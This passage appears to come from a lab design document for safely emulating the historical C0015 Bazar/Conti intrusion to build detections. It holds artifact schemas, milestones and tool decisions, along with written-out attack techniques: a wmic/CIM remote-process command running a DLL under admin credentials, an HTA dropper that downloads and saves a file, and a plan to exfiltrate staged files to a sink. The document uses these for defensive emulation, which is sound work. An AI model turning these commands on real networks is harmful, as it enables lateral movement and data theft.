symlink, SYSTEM, or propagation); restore from backup verifies count/hash/ACL; a mismatch -> `PARTIAL` + incident
note. Output: `ART-13-01` metrics + `ART-14-01` restore verification. Real consumption: S15 consumes `ART-14-01`
to confirm full restoration before concluding the run.

## 7. Artifact Schemas

Every artifact JSON carries the standard envelope plus a typed payload:

```json
{ "artifact_id", "run_id", "scenario_id", "created_utc", "producer_phase", "consumer_phase", "schema_version" }
```

The envelope is mandatory for all artifacts; `schema_version` allows future field additions without breaking
producers or consumers. No artifact may contain password, secret, or credential material (enforced by
`lab_tools.py artifact-check`; the only token-like field permitted is the lab `session_token` format).

### `ART-04-01` discovery result (mirror `found_shares.txt`)

```json
{ "artifact_id": "ART-04-01", "run_id": "RUN-...", "created_utc": "...",
  "producer_phase": 3, "consumer_phase": 4,
  "shares": [ { "host": "FS01", "share": "Finance", "path": "\\\\FS01\\Finance",
                "readable": true, "sample_files": ["budget-q3.txt","payroll-notes.txt"] } ] }
```

Historical mirror: DFIR records ShareFinder writing `c:\ProgramData\found_shares.txt` (created by Rundll32.exe).
The lab may write `C:\ProgramData\found_shares.txt` (text) plus this full JSON. The path mirror is
`[LAB ASSUMPTION]`; detection must not depend on that path.

### `ART-04-02` target manifest

```json
{ "artifact_id": "ART-04-02", "run_id": "RUN-...", "producer_phase": 4, "consumer_phase": 6,
  "target": { "host": "FS01", "ip": "192.168.50.30", "share": "Finance",
              "selection_reason": "readable high-value share from ART-04-01" },
  "auth": { "account": "C0015\\it.admin", "provisioned": true, "provenance": "LAB ASSUMPTION" },
  "allowed_actions": ["wmi_remote_process", "dll_surrogate", "collect_finance_corpus"] }
```

The `selection_reason` must be derived from `ART-04-01` content; hard-coded targets are forbidden.

### `ART-06-01` remote-process evidence

Fields per the H5 contract: FS01 S4624/4672 plus E1 `wmiprvse -> child`, the DLL hash, and the LogonId that links
to the WS01-side S4648 explicit-credential event.

```json
{ "artifact_id": "ART-06-01", "run_id": "RUN-...", "created_utc": "...",
  "producer_phase": 6, "consumer_phase": 7,
  "target": { "host": "FS01" },
  "remote_process": { "image": "rundll32.exe",
                      "command_line": "rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry",
                      "dll_sha256": "<sha256>" },
  "identity": { "logon_id": "<LogonId>", "account": "C0015\\it.admin" },
  "evidence_links": ["WS01 S4648 explicit credential", "FS01 S4624 Type 3", "FS01 S4672",
                     "FS01 S4688", "FS01 E1 wmiprvse -> rundll32"] }
```

### `ART-07-01` session-2 registration receipt (server-side C2-SIM — mandatory)

```json
{ "artifact_id": "ART-07-01", "run_id": "RUN-...", "server": "192.168.50.1:8080",
  "client_ip": "192.168.50.30", "host": "FS01", "stage": "phase7-session2",
  "session_token": "S2-<sha256-16hex>", "registered_utc": "...", "task_ids": ["T-DISCOVER-CORPUS"],
  "evidence_links": ["FS01 E1 rundll32 (parent wmiprvse)", "FS01 E7 ImageLoad", "FS01 E3 -> 192.168.50.1:8080"] }
```

Closure of S9 requires this server-side receipt plus callback telemetry; a marker on FS01 is auxiliary and never
sufficient.

### `ART-08-01` staging manifest

```json
{ "artifact_id": "ART-08-01", "run_id": "RUN-...", "producer_phase": 8, "consumer_phase": 9,
  "files": [ { "path": "\\\\FS01\\Finance\\payroll-notes.txt", "size": 32,
               "sha256": "DEAD1ABD...", "read_utc": "..." } ], "total_bytes": 32 }
```

### `ART-09-01` sink receipt

```json
{ "artifact_id": "ART-09-01", "run_id": "RUN-...", "sink": "192.168.50.1:8081",
  "client_ip": "192.168.50.30", "bytes": 32, "sha256": "DEAD1ABD...", "accepted": true,
  "received_utc": "...", "output_path": "C:\\C0015\\P5\\sink\\received-payroll-notes.txt" }
```

The accepted hash must equal the manifest hash and the sink allowlist; a mismatch produces 403 -> `PREVENTED`.

## 8. Runbook Milestones (M-0..M-10)

| M | Scope | Input | Actions | Output | Gate (pass only on) |
|---|---|---|---|---|---|
| **M-0** | **Offline foundation** | Repo | Write run-ledger schema; `lab_tools` (artifact/manifest/receipt/scorecard); `c2sim_v2` (task allowlist + receipt); synthetic fixtures; tests | `evidence/run-ledger/*`, `scripts/lab_tools.py`, `scripts/c2sim_v2.py`, `scripts/fixtures/*`, `scripts/tests/test_offline.py` | `python scripts/tests/test_offline.py` green; fixtures all `synthetic: true`; schema forbids secrets |
| **M-1** | **First lab slice: env verify + S1-S2 re-run** | VM access + user run approval | (1) Read-only env verify: **Word install state (gate S1)**; wmic presence + **explicit-credential WMI path confirmed working (runas it.admin / Invoke-CimMethod -Credential) — do not use the current token**; **it.admin local admin on FS01 (gate S8)**; audit policy (S4688/4778/4779); `winlog.logon.id` mapping; Sysmon version/config state + **pull live `C:\Tools\sysmon-c0015.xml` from WS01 for hash-reconcile against the repo + decide CAPTURE profile deployment (EID 7 needed for S2/S9)**; loopback S5145 behavior; clock Kali -> DC01; DC01 OS / FS01 NAT / Kali IP. (2) Re-run S1-S2 with run_id + ledger. (3) Resolve the mshta hop from raw E1 | `RUN-<id>` ledger (S1-S2) + env-verify checklist | E1 chain + **E7 hash (after scoped EID 7 deploy)** + run_id fully recorded; mshta hop resolved or `UNRESOLVED` with reason |
| M-2 | S3 session 1 | C2-SIM (M-0) + benign agent | Deploy C2-SIM on the lab host; agent spawned by bootstrap; register/task loop | `session1` + receipt S1 | Receipt + at least 1 cycle + run_id |
| M-3 | S4-S6 discovery -> decision | session1 | DFIR commands -> `ART-04-01` -> orchestrator -> `ART-04-02` | `art04_01/02` | Target derived from artifact (logged reason); C1 DETECTED |
| M-4 | S7-S9 auth -> WMI -> session 2 | `art04_02` + credential handle | Controls x3 -> tool handoff C$ -> wmic/CIM -> register session2 | `art05_01`, `art06_01`, `ART-07-01` | 4-gate + receipt; NOT marker-only |
| M-5 | S10-S11a collection -> transfer r1 | session2 | Read corpus -> manifest -> POST sink | `art08_01`, `art09_01[r1]` | Cross-hash match; sender + receiver evidence |
| M-6 | S12 RDP | after S11a | RDP session -> DET-008 | `art10_01` | DET-008 defined + evidence |
| M-7 | S11b transfer r2 | `art08_01` | Second POST | `art09_01[r2]` | 2 receipts, same run |
| M-8 | S13/S13b precursor | fixtures | Optional install + E10 analysis | note | No sensitive data |
| M-9 | S14 impact + restore | `art12_01` + simulator | Transform + restore verify | `art13_01/14_01` | No exit from corpus; restore matches |
| M-10 | S15 E2E x2 | all state | Engineering + investigation runs | `art15_01` | Scorecard; ledger hidden in the investigation run |

**Default per-stage rollback:** delete that stage's artifacts/state and reverse the VM actions (delete dropped
files, kill spawned processes, revoke the credential handle, restore the corpus), then record
`rollback_status` in the ledger.

## 9. Implementation Notes

### a) S7 -> S8: WMI identity must be an explicit credential

A `net use \\FS01\IPC$` session **does not change the WS01 process token**; it serves only 8a (SMB copy). WMI (8b)
must run under the `it.admin` identity:

```powershell
# Primary — keeps wmic.exe telemetry (T1047); the password is entered at the prompt,
# never on the command line or in logs:
runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""

# Alternate — explicit PSCredential (telemetry is powershell.exe, not wmic.exe -> record PARTIAL):
$cred = Get-Credential C0015\it.admin
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred `
  -Arguments @{ CommandLine = "rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry" }
```

Identity evidence: **WS01 S4648 (explicit credential) + FS01 S4624/4672 on the same LogonId matching the selected
account**. The S8 gate closes only with S4648 plus a matching LogonId. Never use `wmic /password:*` — it leaks the
secret into the command line and logs.

### b) S2: HTA JScript has no `atob()`

`atob()` / `btoa()` are browser APIs and are not guaranteed to exist in JScript/MSHTML running inside an HTA.
Decode base64 with VBScript + MSXML `bin.base64` (mirrors T1027); JScript performs only the HTTP GET (T1059.007):

```html
<script language="VBScript">
  ' [LAB-SURROGATE] base64 decode via MSXML bin.base64 — no JS atob()
  Function B64Decode(s)
    Dim doc, el
    Set doc = CreateObject("Msxml2.DOMDocument")
    Set el = doc.createElement("b64")
    el.dataType = "bin.base64" : el.text = s
    B64Decode = el.nodeTypedValue
  End Function
  Dim b : b = B64Decode("YzAwMTUgbGFiIGJlbmlnbg==")   ' "c0015 lab benign"
  Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
  fso.CreateTextFile("C:\Users\Public\C0015\b64-marker.txt", True).Write "c0015 lab benign"
</script>
<script language="JScript">
  // [LAB-SURROGATE] JS: HTTP GET + save DLL (no atob)
  var x = new ActiveXObject("MSXML2.ServerXMLHTTP");
  x.open("GET", "http://192.168.50.100:8000/c0015-comparefor.jpg", false); x.send();
  var s = new ActiveXObject("ADODB.Stream"); s.Open(); s.Type = 1; s.Write(x.responseBody);
  s.SaveToFile("C:\\Users\\Public\\C0015\\c0015-comparefor.jpg", 2);
</script>
```

### c) S11: chunked transfer pending sink v2

`p5_sink` currently accepts **one POST of at most 1024 bytes** and hashes the whole body. Real T1030 chunking
requires sink v2: accept a sequence of POSTs carrying `chunk-index`/`chunk-total` plus a session, reassemble, then
hash against the allowlist. Until sink v2 exists, S11 runs a **single POST of at most 1024 bytes** (allowlist hash
unchanged) and records T1030 as an **approximation (fixed size limit)**.

### d) Credential handling and artifact hygiene

Each run generates a fresh **credential handle** for the pre-provisioned account (`it.admin`, limited rights on
FS01, not Domain Admin). The handle lives only in the operator's secrets manager, outside the repo; the ledger,
artifacts, and logs contain only `account_name` + `sid` + `handle_ref` (placeholder). Provenance for the historical
credential pivot remains `[UNKNOWN-C0015]`; no static default credential is used. Identity verification: S4624/4672
LogonId must match the SID of the selected handle. `lab_tools.py artifact-check` rejects any artifact containing
`password`/`secret`/`token` keys (only the lab `session_token` format is allowed).

### e) S13b LSASS access study — detection-design criteria (replay only)

`T1003.001` (`[SUPPLEMENTAL-LAB-TECHNIQUE]`, user-managed) — not in the canonical 34 and not historical C0015
behavior. Detection design only: no extraction commands, no tool execution, no use of obtained credentials for WMI.

- Detection goal: flag an **attempt** to access lsass — E10 `ProcessAccess` with `TargetImage=lsass.exe` from a
  process that is not system-expected; E11 tool drop; E1 suspicious child.
- Evidence to collect: E10 (source/target ProcessGuid), E11 (tool path), E1 (ancestry), S4656/4663 (if audited).
- Correlation `C-LSASS`: E10(lsass) with the same ProcessGuid -> E11/E1 within a 10-minute window; control: E10
  from a legitimate process (csrss/system) must not fire.
- Evaluation: rule fires on the synthetic fixture `e10_lsass_probe.json`; does not fire on the control fixture;
  validation is **replay only**.
- Ordering: DFIR places Process Hacker/LSASS on day 5 and does **not** prove it was the source of the earlier WMI
  pivot credential. The branch therefore sits only at S13b, after both transfer rounds.

## 10. Tool and Component Decisions

| Tool/tech | Decision | Reason |
|---|---|---|
| Word macro, mshta, regsvr32, rundll32, cmd/net/nltest/tasklist/ping, RDP | **USE** (native, benign) | Historical mechanism preserved; payload replaced with benign content |
| wmic | **USE** where the build has it; fallback **SAFE SURROGATE** (PowerShell `Invoke-CimMethod`) | wmic is removed on 24H2+; different telemetry -> record `PARTIAL` |
| Bazar, Cobalt Strike (beacon/C2), Rclone | **SAFE SURROGATE** (C2-SIM v3 dynamic tasking; internal HTTP POST sink) | No real malware/C2; no MEGA; benign command strings only |
| Conti | **SAFE SURROGATE** (bounded simulator, corpus-only) | No real ransomware |
| AdFind | **NOT USED** | DFIR records only the file write, no execution |
| AnyDesk | **NOT USED** (public relay) | Optional portable install into an unusual path only for path telemetry |
| Process Hacker / Mimikatz / LSASS access | **REPLAY ONLY** (E10 fixtures) | Detection-design branch, `[SUPPLEMENTAL-LAB-TECHNIQUE]`; no tool run, no extraction |
| Injection (D8B3 -> Winlogon, 143 -> svchost) | **REPLAY ONLY / ANALYSIS** (toy `lab-target.exe` if approved) | Never inject system processes; no injection code |
| C2 framework OSS (Sliver/Mythic/...) | **NOT USED** | Project boundary |

Full C2 role mapping and payload design: `docs/payloads-and-c2.md`.

## 11. Known Unknowns and Telemetry Gaps

- **C0015:** credential provenance for the WMI pivot `[UNKNOWN-C0015]`; the mechanism that placed 143.dll on the
  target before rundll32 `[UNKNOWN-C0015]` (lab: supplemental C$ copy); exact command line / export of 143.dll;
  Conti batch contents; whether the RDP credential matched the WMI credential; why D574 never connected; D8B3 ->
  Winlogon mechanism details.
- **Lab:** current VM IP/config; whether the working-tree Sysmon config was deployed; Elastic-to-repo parity rule;
  wmic presence; loopback S5145; Kali clock skew; post-2026-09-19 claims `[NOT-VERIFIED-IN-REPO]`; Phase 1
  PID/entity conflict `UNRESOLVED`.
- **Recorded telemetry gaps:** E3 without process attribution (P1-B) and E3 missing (P1-C); E1 does not by itself
  prove the macro; E19-21 are unrelated to remote process creation; EID 3 is a network connection, not RPC.

## 12. Repository Rules

- No commit, push, or deploy from this repository's working tree.
- Sysmon profile changes go through the two committed profiles under `configs/sysmon/`
  (`sysmon-c0015-balanced.xml` routine, `sysmon-c0015-capture.xml` observation) and an explicit M-1 decision;
  do not edit detection files outside that scope.
- No secrets in the repo; run a secret scan before any future commit.
- Statuses (`NOT RUN`, `NOT VERIFIED`, `NARRATIVE ONLY`, `DESIGN ONLY`, `ANALYSIS / REPLAY ONLY`, `PARTIAL`,
  `PREVENTED`, `SENSOR GAP`, `BLOCKED BY ENVIRONMENT`) are preserved as-is until a run produces evidence.